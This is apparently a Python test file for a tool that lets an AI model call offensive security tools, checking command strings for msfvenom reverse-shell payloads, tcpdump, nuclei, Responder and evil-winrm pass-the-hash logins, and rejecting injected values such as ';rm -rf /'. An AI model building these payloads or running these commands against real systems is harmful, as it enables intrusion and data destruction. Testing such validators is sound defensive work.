"""第四批深度定制档案测试：msfvenom / tcpdump / nuclei / responder / evil-winrm。"""

import asyncio
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from kalitui.profiles import REGISTRY, all_schemas, lore_for, register_extensions  # noqa: E402
from kalitui.profiles.evilwinrm import _build_cmd as winrm_cmd  # noqa: E402
from kalitui.profiles.msfvenom import _build_cmd as msfvenom_cmd  # noqa: E402
from kalitui.profiles.nuclei import _build_cmd as nuclei_cmd  # noqa: E402
from kalitui.profiles.responder import _build_cmd as responder_cmd  # noqa: E402
from kalitui.profiles.tcpdump import _build_cmd as tcpdump_cmd  # noqa: E402
from kalitui.safety import classify  # noqa: E402

# ---------------- 命令构造与校验 ----------------


def test_msfvenom_cmd() -> None:
    cmd, _ = msfvenom_cmd(
        {"payload": "linux/x64/meterpreter/reverse_tcp", "lhost": "192.168.1.35", "lport": 4444}
    )
    assert cmd == (
        "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.35 LPORT=4444 -f elf -o /tmp/payload.elf"
    )
    cmd2, _ = msfvenom_cmd(
        {
            "payload": "windows/x64/meterpreter/reverse_tcp",
            "lhost": "10.0.0.1",
            "lport": 443,
            "format": "exe",
            "outfile": "/tmp/shell.exe",
            "encoder": "x64/xor_dynamic",
        }
    )
    assert "windows/x64/meterpreter/reverse_tcp" in cmd2
    assert "-f exe -o /tmp/shell.exe" in cmd2
    assert "-e x64/xor_dynamic" in cmd2

    with pytest.raises(ValueError):
        msfvenom_cmd({"payload": "linux/x64/shell/reverse_tcp", "lhost": "1.2.3.4", "lport": 99999})
    with pytest.raises(ValueError):
        msfvenom_cmd({"payload": "evil/payload", "lhost": "1.2.3.4", "lport": 4444})
    with pytest.raises(ValueError):
        msfvenom_cmd({"payload": "linux/x64/meterpreter/reverse_tcp", "lhost": "1.2.3.4;id", "lport": 4444})
    with pytest.raises(ValueError):
        msfvenom_cmd({"payload": "linux/x64/meterpreter/reverse_tcp", "lhost": "1.2.3.4", "lport": 4444, "outfile": "/etc/passwd"})

    # 危险等级
    assert classify(cmd).level == "confirm"


def test_tcpdump_cmd() -> None:
    cmd, timeout = tcpdump_cmd({})
    assert cmd.startswith("timeout 20 tcpdump -i any -c 50 -nn")
    assert timeout > 20
    cmd2, _ = tcpdump_cmd({"interface": "wlan0", "filter": "tcp port 445", "count": 10, "seconds": 5, "verbose": True})
    assert "timeout 5 tcpdump -i wlan0 -v -c 10 -nn -- tcp port 445" in cmd2
    with pytest.raises(ValueError):
        tcpdump_cmd({"filter": "tcp port 80; rm -rf /"})
    with pytest.raises(ValueError):
        tcpdump_cmd({"interface": "eth0;ls"})


def test_nuclei_cmd() -> None:
    cmd, _ = nuclei_cmd({"target": "http://10.0.0.5"})
    assert cmd == "nuclei -u http://10.0.0.5 -severity medium -rate-limit 100 -silent"
    cmd2, _ = nuclei_cmd({"target": "192.168.1.0/24", "severity": "high", "tags": "cve,oast", "rate": 50})
    assert "192.168.1.0/24" in cmd2 and "-severity high" in cmd2 and "-tags cve,oast" in cmd2 and "-rate-limit 50" in cmd2
    with pytest.raises(ValueError):
        nuclei_cmd({"target": "http://x.com;ls"})
    with pytest.raises(ValueError):
        nuclei_cmd({"target": "http://x.com", "severity": "ultra"})
    assert classify(cmd).level == "confirm"


def test_responder_cmd() -> None:
    cmd, timeout = responder_cmd({})
    assert cmd == "timeout 15 responder -I eth0 -A"
    assert timeout > 15
    cmd2, _ = responder_cmd({"interface": "wlan0", "seconds": 30})
    assert "timeout 30 responder -I wlan0 -A" in cmd2
    with pytest.raises(ValueError):
        responder_cmd({"interface": "eth0;id"})
    assert classify(cmd).level == "confirm"


def test_winrm_cmd() -> None:
    cmd, _ = winrm_cmd({"host": "10.0.0.10", "username": "administrator", "password": "P@ssw0rd"})
    assert cmd == "evil-winrm -i 10.0.0.10 -u administrator -P 5985 -p P@ssw0rd -c whoami"
    cmd2, _ = winrm_cmd({"host": "10.0.0.10", "username": "admin", "hash": "a" * 32, "command": "ipconfig"})
    assert "-H " + "a" * 32 in cmd2 and "-c ipconfig" in cmd2
    with pytest.raises(ValueError):
        winrm_cmd({"host": "10.0.0.10", "username": "admin"})  # 无凭据
    with pytest.raises(ValueError):
        winrm_cmd({"host": "10.0.0.10", "username": "admin", "password": "x", "hash": "y"})
    with pytest.raises(ValueError):
        winrm_cmd({"host": "10.0.0.10", "username": "admin", "hash": "zz"})
    with pytest.raises(ValueError):
        winrm_cmd({"host": "10.0.0.10", "username": "admin", "password": "x", "command": "whoami;rm -rf /"})
    assert classify(cmd).level == "confirm"


# ---------------- registry / lore ----------------


def test_registry_fourth_batch() -> None:
    names = [s["function"]["name"] for s in all_schemas()]
    for t in ("payload_gen", "tcpdump_capture", "nuclei_scan", "responder_analyze", "winrm_exec"):
        assert t in names
    pnames = [p.name for p in REGISTRY]
    for n in ("msfvenom", "tcpdump", "nuclei", "responder", "evil-winrm"):
        assert n in pnames
    assert len(REGISTRY) >= 19


def test_lore_fourth_batch() -> None:
    assert "msfvenom" in lore_for([{"role": "user", "content": "生成一个反弹 shell 的 payload"}])
    assert "tcpdump" in lore_for([{"role": "user", "content": "抓一下 445 端口的流量"}])
    assert "nuclei" in lore_for([{"role": "user", "content": "用模板扫一下这个站点的 cve"}])


# ---------------- stub 流转 ----------------


class StubEx4:
    def __init__(self):
        self.calls: list[tuple[str, dict]] = []
        self.danger_policy = "ask"
        self.extensions: dict = {}

    async def execute(self, name: str, arguments: dict) -> str:
        self.calls.append((name, arguments))
        return "STUB-OUTPUT\nFinal size of file: 123 bytes"


@pytest.mark.asyncio
async def test_fourth_batch_route_to_run_command(monkeypatch: pytest.MonkeyPatch) -> None:
    import kalitui.profiles.nuclei as nuc_mod

    monkeypatch.setattr(nuc_mod, "check_installed", lambda _b: True)  # 本机未装 nuclei，测试时跳过检查
    stub = StubEx4()
    register_extensions(stub)  # type: ignore[arg-type]

    await stub.extensions["payload_gen"](
        stub, {"payload": "linux/x64/meterpreter/reverse_tcp", "lhost": "10.0.0.1", "lport": 4444}
    )
    assert "msfvenom -p linux/x64/meterpreter/reverse_tcp" in stub.calls[-1][1]["command"]

    await stub.extensions["tcpdump_capture"](stub, {"filter": "tcp port 22", "count": 5, "seconds": 3})
    assert "timeout 3 tcpdump" in stub.calls[-1][1]["command"]

    await stub.extensions["nuclei_scan"](stub, {"target": "http://10.0.0.5"})
    assert "nuclei -u http://10.0.0.5" in stub.calls[-1][1]["command"]

    await stub.extensions["responder_analyze"](stub, {"seconds": 5})
    assert "responder -I eth0 -A" in stub.calls[-1][1]["command"]

    await stub.extensions["winrm_exec"](stub, {"host": "10.0.0.10", "username": "admin", "password": "x"})
    assert "evil-winrm -i 10.0.0.10" in stub.calls[-1][1]["command"]

    # payload 生成成功摘要
    out = await stub.extensions["payload_gen"](
        stub, {"payload": "linux/x64/meterpreter/reverse_tcp", "lhost": "10.0.0.1", "lport": 4444}
    )
    assert "payload 已生成" in out
